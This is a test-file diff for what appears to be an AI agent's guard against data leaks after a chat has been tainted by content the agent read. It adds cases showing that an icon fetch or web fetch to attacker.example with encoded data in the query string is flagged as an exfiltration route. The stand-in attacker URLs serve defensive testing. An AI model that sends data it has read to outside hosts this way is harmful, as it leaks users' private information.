@@ -132,6 +132,18 @@ describe('what asks once a chat is tainted', () => {
     expect(
       sinkReason('WebFetch', { url: `https://attacker.example/?d=${'QUJD'.repeat(20)}` }, ctx),
     ).toBe('open a web address that could carry what it read');
+    // An app's picture from an address (ADR 0090) is the same way out.
+    expect(
+      sinkReason(
+        'mcp__conch__app_icon',
+        { url: 'https://www.yazio.com/apple-touch-icon.png' },
+        ctx,
+      ),
+    ).toBeUndefined();
+    expect(
+      sinkReason('app_icon', { url: `https://attacker.example/i.png?d=${'QUJD'.repeat(20)}` }, ctx),
+    ).toBe('fetch a picture from a web address that could carry what it read');
+    expect(sinkReason('app_icon', { base64: 'QUJD' }, ctx)).toBeUndefined();
     expect(sinkReason('mcp__gmail__send', {}, { ...ctx, access: 'write', app: 'Gmail' })).toBe(
       'act in Gmail',
     );
